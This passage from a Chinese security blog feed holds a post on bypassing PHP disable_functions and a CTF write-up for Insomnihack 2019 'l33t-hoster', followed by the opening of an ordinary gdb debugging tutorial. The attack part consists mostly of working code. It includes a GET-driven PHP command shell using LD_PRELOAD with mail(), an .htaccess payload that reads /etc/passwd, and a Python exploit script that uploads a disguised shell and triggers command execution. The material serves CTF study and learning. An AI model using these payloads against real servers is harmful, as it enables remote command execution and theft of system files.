$_GET[&quot;cmd&quot;];</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; </span><br><span class="line">    unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>当然还要再辅助一个.so文件才行具体请看</p><blockquote><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/README.md" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/README.md</a></p></blockquote><p>举个例子前段时间的Insomnihack Teaser 2019 Web题 l33t-hoster </p><h2 id="l33t-hoster-WriteUp-bypass-disable-function"><a href="#l33t-hoster-WriteUp-bypass-disable-function" class="headerlink" title="l33t-hoster WriteUp bypass disable function"></a>l33t-hoster WriteUp bypass disable function</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&quot;source&quot;]))</span><br><span class="line">    die(highlight_file(__FILE__));</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">if (!isset($_SESSION[&quot;home&quot;])) &#123;</span><br><span class="line">    $_SESSION[&quot;home&quot;] = bin2hex(random_bytes(20));</span><br><span class="line">&#125;</span><br><span class="line">$userdir = &quot;images/&#123;$_SESSION[&quot;home&quot;]&#125;/&quot;;</span><br><span class="line">if (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$disallowed_ext = array(</span><br><span class="line">    &quot;php&quot;,</span><br><span class="line">    &quot;php3&quot;,</span><br><span class="line">    &quot;php4&quot;,</span><br><span class="line">    &quot;php5&quot;,</span><br><span class="line">    &quot;php7&quot;,</span><br><span class="line">    &quot;pht&quot;,</span><br><span class="line">    &quot;phtm&quot;,</span><br><span class="line">    &quot;phtml&quot;,</span><br><span class="line">    &quot;phar&quot;,</span><br><span class="line">    &quot;phps&quot;,);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;upload&quot;])) &#123;</span><br><span class="line">    if ($_FILES[&apos;image&apos;][&apos;error&apos;] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">        die(&quot;yuuuge fail&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $tmp_name = $_FILES[&quot;image&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    $name = $_FILES[&quot;image&quot;][&quot;name&quot;];</span><br><span class="line">    $parts = explode(&quot;.&quot;, $name);</span><br><span class="line">    $ext = array_pop($parts);</span><br><span class="line"></span><br><span class="line">    if (empty($parts[0])) &#123;</span><br><span class="line">        array_shift($parts);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (count($parts) === 0) &#123;</span><br><span class="line">        die(&quot;lol filename is empty&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (in_array($ext, $disallowed_ext, TRUE)) &#123;</span><br><span class="line">        die(&quot;lol nice try, but im not stupid dude...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $image = file_get_contents($tmp_name);</span><br><span class="line">    if (mb_strpos($image, &quot;&lt;?&quot;) !== FALSE) &#123;</span><br><span class="line">        die(&quot;why would you need php in a pic.....&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!exif_imagetype($tmp_name)) &#123;</span><br><span class="line">        die(&quot;not an image.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $image_size = getimagesize($tmp_name);</span><br><span class="line">    if ($image_size[0] !== 1337 || $image_size[1] !== 1337) &#123;</span><br><span class="line">        die(&quot;lol noob, your pic is not l33t enough&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name = implode(&quot;.&quot;, $parts);</span><br><span class="line">    move_uploaded_file($tmp_name, $userdir . $name . &quot;.&quot; . $ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;h3&gt;Your &lt;a href=$userdir&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;&quot;;</span><br><span class="line">foreach(glob($userdir . &quot;*&quot;) as $file) &#123;</span><br><span class="line">    echo &quot;&lt;li&gt;&lt;a href=&apos;$file&apos;&gt;$file&lt;/a&gt;&lt;/li&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;/ul&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Upload your pics!&lt;/h1&gt;</span><br><span class="line">&lt;form method=&quot;POST&quot; action=&quot;?&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;image&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=upload&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><h3 id="write-up"><a href="#write-up" class="headerlink" title="write up"></a>write up</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.这道题禁止php后缀的文件，或者是同意的后缀文件上传</span><br><span class="line">2.上传必须满足getimagesize（）函数</span><br><span class="line">3.图片必须是大小为1337x1337的有效图像</span><br><span class="line">4.上传的文件不能包含&lt;?。</span><br></pre></td></tr></table></figure><p>这里并没有禁用<code>.htaccess</code>，我们可以通过上传<code>.htaccess</code>文件构造，使一种我们想要的后缀格式解析成php。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value是.htaccess文件中可以用的指令之一。该指令允许我们使用PHP_INI_PERDIR标志修改此处列表里的任何设置。</span><br><span class="line"></span><br><span class="line">在这些设置中，有个auto_append_file，它允许我们在请求PHP文件时添加或包含一个文件。后来发现，auto_append_file还允许各种包装器，如php://。</span><br></pre></td></tr></table></figure><p>我们可以构造<code>.htaccess</code>文件内容为，将以<code>.corb3nik</code>为文件后缀的文件解析为php文件，并且当我们发起一个php文件请求时返回我们需要的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .corb3nik</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;</span><br></pre></td></tr></table></figure><p>现在我们需要构造一个满足getimagesize()的<code>.htaccess</code>文件，<br>在<code>.htaccess</code>文件中#与<code>\x00</code>为注释符号<br>所以我们只需要构造一个满足二进制头为<code>\x00</code>且满足getimagesize函数的文件即可，需要满足如下文件格式<br><img src="https://i.imgur.com/NJ4iKDC.png" alt=""><br>我们可以构造.wbmp文件<br>并以如下作为开头，我们便可以构造任意的脚本了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000 8a39 8a39</span><br></pre></td></tr></table></figure><p>如何绕过<br><code>&lt;?</code> 的限制呢？<br>1.使用base64编码<br>2.使用php_value zend.script_encoding “UTF-7” 使用utf-7进行绕过<br>所以我们就可以通过类似以下脚本，配合一个.so文件就可以执行我么想要的命令了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">VALID_WBMP = b&quot;\x00\x00\x8a\x39\x8a\x39\x0a&quot;</span><br><span class="line">URL = &quot;xxx&quot;</span><br><span class="line">RANDOM_DIRECTORY = &quot;d53f37bed6ba5becd1993231b9a07593d6939b2a&quot;</span><br><span class="line"></span><br><span class="line">COOKIES = &#123;</span><br><span class="line">    &quot;PHPSESSID&quot; : &quot;btvfccrafpo65jd9oa64u26bf2&quot;&#125;</span><br><span class="line"></span><br><span class="line">def upload_content(name, content):</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;image&quot; : (name, content, &apos;image/png&apos;),</span><br><span class="line">        &quot;upload&quot; : (None, &quot;Submit Query&quot;, None)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(URL, files=data, cookies=COOKIES)</span><br><span class="line"></span><br><span class="line">HT_ACCESS = VALID_WBMP + b&quot;&quot;&quot;</span><br><span class="line">AddType application/x-httpd-php .corb3nik</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.corb3nik&quot;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">TARGET_FILE = VALID_WBMP + b&quot;AAA&quot; + base64.b64encode(b&quot;&quot;&quot;</span><br><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;</span><br><span class="line">    $cmd = &quot;pwd&quot;;</span><br><span class="line">    $out_path = &quot;_0utput.txt&quot;;</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line">    $so_path = &quot;/var/www/bypass_disablefunc_x64.so&quot;;</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; </span><br><span class="line">    unlink($out_path);</span><br><span class="line">?&gt;</span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line">upload_content(&quot;..htaccess&quot;, HT_ACCESS)</span><br><span class="line">upload_content(&quot;shell.corb3nik&quot;, TARGET_FILE)</span><br><span class="line">upload_content(&quot;trigger.corb3nik&quot;, VALID_WBMP)</span><br><span class="line">response = requests.post(URL + &quot;/images/&quot; + RANDOM_DIRECTORY + &quot;/trigger.corb3nik&quot;)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p>这里还有一个问题，我们该如何上传so文件呢？我们时不可以构造满足函数getimagesize（）的so文件的，经过发现我们可以找到<code>move_uploaded_file</code>并没有被禁用，于是我们可以构造一个文件上传的PHP文件<br>如下，我们便可以上传so文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt; form  method = “ POST ”  action = “ upl.asp ”  enctype = “ multipart / form-data ” &gt;</span><br><span class="line">    &lt; input  type = “ file ”  name = “ image ” &gt;</span><br><span class="line">&lt; input  type = “ text ”  name = “ name ” &gt;</span><br><span class="line">    &lt; input  type = “ submit ”  name = upload &gt;</span><br><span class="line">&lt;/ form &gt;</span><br></pre></td></tr></table></figure><p>通过这样我们就可以执行任意我们想要的系统命令了。<br>当然我们也可以直接上传一个文件<br>通过如下payload也可以造成相同效果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file($_FILES[&apos;evil&apos;][&apos;tmp_name&apos;], &apos;/tmp/evil.so&apos;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">其实我们可以构造类似这样的payload</span><br><span class="line">PHP的mail()函数调用execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;/usr/sbin/sendmail -t -i &quot;], ...)。 但是貌似这样时没有回显的。</span><br></pre></td></tr></table></figure><blockquote><p>当然我个人是认为smod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制也是可以的。</p></blockquote><p>有关文件上传的函数请查阅函数 <code>is_uploaded_file()</code> 和 <code>move_uploaded_file()</code> 以获取进一步的信息。以下范例处理由表单提供的文件上传。</p><p>附加备忘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看进程调用系统函数明细。linux 创建新进程的过程较为复杂，我关心进程加载了哪些共享对象、可能调用哪些 API、实际调用了哪些 API。比如，运行 /usr/bin/id，通过 ldd 可查看系统为其加载的共享对象：</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://blog.csdn.net/haoel/article/details/1602108" target="_blank" rel="noopener">https://blog.csdn.net/haoel/article/details/1602108</a><br><a href="https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#</a><br><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a><br><a href="https://blog.csdn.net/haoel/article/details/1602108" target="_blank" rel="noopener">https://blog.csdn.net/haoel/article/details/1602108</a></p><p><a href="https://xz.aliyun.com/t/3941#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3941#toc-2</a><br><a href="https://blog.mythsman.com/2015/12/01/1/" target="_blank" rel="noopener">https://blog.mythsman.com/2015/12/01/1/</a><br><a href="https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md" target="_blank" rel="noopener">https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md</a><br><a href="http://php.net/manual/zh/features.file-upload.post-method.php" target="_blank" rel="noopener">http://php.net/manual/zh/features.file-upload.post-method.php</a><br><a href="https://blog.csdn.net/qq_27446553/article/details/80235811" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/80235811</a><br><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      bypass disable function的学习与实践
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="bypass" scheme="https://museljh.github.io/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>从零开始学习使用gdb调试PHP源码</title>
    <link href="https://museljh.github.io/2019/03/29/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8gdb%E8%B0%83%E8%AF%95PHP%E6%BA%90%E7%A0%81/"/>
    <id>https://museljh.github.io/2019/03/29/从零开始学习使用gdb调试PHP源码/</id>
    <published>2019-03-29T06:19:25.000Z</published>
    <updated>2019-03-29T06:36:51.357Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>GDB是一个由GNU开源组织发布的、UNIX/LINUX操作系统下的、基于命令行的、功能强大的程序调试工具。 对于一名Linux下工作的c++程序员，gdb是必不可少的工具；</p><h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">b/break ：设置断点</span><br><span class="line">delete ：清除断点</span><br><span class="line">continue ：继续终止的程序</span><br><span class="line">run/r ：运行程序</span><br><span class="line">step/s ：单步运行，进入函数</span><br><span class="line">next/n ：单步运行，不进入函数</span><br><span class="line">list/l ：显示源代码，每次显示10行</span><br><span class="line">bt/backtrace ：显示栈中的内容</span><br><span class="line">print/p ：显示queue中的内容</span><br><span class="line">kill ：终止正在调试的程序</span><br><span class="line">file ：装入将要调试的文件</span><br><span class="line">info variables 命令将打印出所有程序变量的值</span><br><span class="line">info locals 命令时，gdb 会打印出当前帧中的局部变量</span><br><span class="line">bt 程序“调用堆栈”是当前函数之前的所有已调用函数的列表（包括当前函数）</span><br><span class="line">q ：退出gdb</span><br></pre></td></tr></table></figure><h2 id="gdb调试入门"><a href="#gdb调试入门" class="headerlink" title="gdb调试入门"></a>gdb调试入门</h2><h3 id="简单的使用gdb分析程序错误"><a href="#简单的使用gdb分析程序错误" class="headerlink" title="简单的使用gdb分析程序错误"></a>简单的使用gdb分析程序错误</h3><p>将以下样本代码保存成.c文件格式,这段程序意思为循环十次并输出，使用<code>gcc -g eg1.c -o eg1</code> 进行编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int wib(int no1, int no2)</span><br><span class="line">&#123;</span><br><span class="line">  int result, diff;</span><br><span class="line">  diff = no1 - no2;</span><br><span class="line">  result = no1 / diff;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">  int value, div, result, i, total;</span><br><span class="line">  value = 10;</span><br><span class="line">  div = 6;</span><br><span class="line">  total = 0;</span><br><span class="line">  for(i = 0; i &lt; 10; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    result = wib(value, div);</span><br><span class="line">    total += result;</span><br><span class="line">    div++;</span><br><span class="line">    value--;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;%d wibed by %d equals %d\n&quot;, value, div, total);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们直接执行<code>./eg1</code>，时候会爆出<code>Floating point exception</code>错误，我们需要使用gdb调试来寻找这个错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@iZwz9hyvb5rjm3oubt8o15Z:~/gbk_test# ./eg1 </span><br><span class="line">Floating point exception</span><br></pre></td></tr></table></figure><p>我们将使用<code>gdb eg1</code>启动gdb（没有安装的需要apt-get install gdb)，启动后我们直接使用run命令运行我们的程序，如下可以看到在第6行的时候发生了一个错误。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGFPE, Arithmetic exception.</span><br><span class="line">0x000000000040053d in wib (no1=8, no2=8) at eg1.c:6</span><br><span class="line">6  result = no1 / diff;</span><br></pre></td></tr></table></figure><p>我们使用<code>print no1</code> <code>print diff</code> 来打印出这两个变量的值，可以看出出错的原因是因为diff值为0导致算术异常</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print no1 </span><br><span class="line">$1 = 8</span><br><span class="line">(gdb) print diff</span><br><span class="line">$2 = 0</span><br></pre></td></tr></table></figure><p>当发现异常后，假若我们使用continue命令，程序将继续执行下去，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Program terminated with signal SIGFPE, Arithmetic exception.</span><br><span class="line">The program no longer exists.</span><br></pre></td></tr></table></figure><h3 id="使用断点进行分析"><a href="#使用断点进行分析" class="headerlink" title="使用断点进行分析"></a>使用断点进行分析</h3><p>我们可以使用break命令进行断点，比如我们想知道main函数中到底是什么导致了错误发生我们可以使用break main ， 并且我们可以使用list main 来查看main 附近10 行代码的具体情况 ，使用回车可以继续查看接下来的10行代码，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">15  for(i = 0; i &lt; 10; i++)</span><br><span class="line">16  &#123;</span><br><span class="line">17    result = wib(value, div);</span><br><span class="line">18    total += result;</span><br><span class="line">19    div++;</span><br><span class="line">20    value--;</span><br></pre></td></tr></table></figure><p>我们可以看到，在第17行的时候我们使用了wib 函数 ，于是我们使用break 17 来设置断点 （ 当然任何我们感兴趣的函数我们都可以设置断点进行查看）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) break  17 </span><br><span class="line">Breakpoint 2 at 0x400575: file eg1.c, line 17.</span><br></pre></td></tr></table></figure><p>我们可以使用info break 来查看当前设置的断点情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info break</span><br><span class="line">Num     Type           Disp Enb Address            What</span><br><span class="line">1       breakpoint     keep y   0x0000000000400557 in main at eg1.c:12</span><br><span class="line">2       breakpoint     keep y   0x0000000000400575 in main at eg1.c:17</span><br></pre></td></tr></table></figure><p>我们也可以使用<code>delete 1</code> 删除第一个断点（<code>可以使用命令 &#39;disable &lt;breakpoint number&gt;&#39;、&#39;enable &lt;breakpoint number&gt;&#39; 或 &#39;delete &lt;breakpoint number&gt;&#39; 来禁用、启用和彻底删除断点，</code>），再次查看的时候我们可以看到断点1 已经被我们删除成功了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) delete 1</span><br><span class="line">(gdb) info break</span><br><span class="line">Num     Type           Disp Enb Address            What</span><br><span class="line">2       breakpoint     keep y   0x0000000000400575 in main at eg1.c:17</span><br></pre></td></tr></table></figure><p>我们重新使用run，这时候程序将会终端在我们设置断点的位置，我们可也使用print 将wib 函数的 参数打印出来，当然我们同样可以使用<code>info locals</code>命令将局部变量值打印出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run</span><br><span class="line">Starting program: /root/gbk_test/eg1 </span><br><span class="line"></span><br><span class="line">Breakpoint 2, main (argc=1, argv=0x7fffffffe5a8) at eg1.c:17</span><br><span class="line">17    result = wib(value, div);</span><br><span class="line">(gdb) print value </span><br><span class="line">$3 = 10</span><br><span class="line">(gdb) print div</span><br><span class="line">$4 = 6</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info locals</span><br><span class="line">value = 10</span><br><span class="line">div = 6</span><br><span class="line">result = 0</span><br><span class="line">i = 0</span><br><span class="line">total = 0</span><br></pre></td></tr></table></figure><p>我们可以使用<code>next</code>进入函数中查看value div两变量的变化情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">(gdb) next</span><br><span class="line">18    total += result;</span><br><span class="line">(gdb) </span><br><span class="line">19    div++;</span><br><span class="line">(gdb) </span><br><span class="line">20    value--;</span><br><span class="line">(gdb) </span><br><span class="line">15  for(i = 0; i &lt; 10; i++)</span><br><span class="line">(gdb) </span><br><span class="line"></span><br><span class="line">Breakpoint 2, main (argc=1, argv=0x7fffffffe5a8) at eg1.c:17</span><br><span class="line">17    result = wib(value, div);</span><br><span class="line">(gdb) </span><br><span class="line">18    total += result;</span><br><span class="line">(gdb) </span><br><span class="line">19    div++;</span><br><span class="line">(gdb) </span><br><span class="line">20    value--;</span><br><span class="line">(gdb) 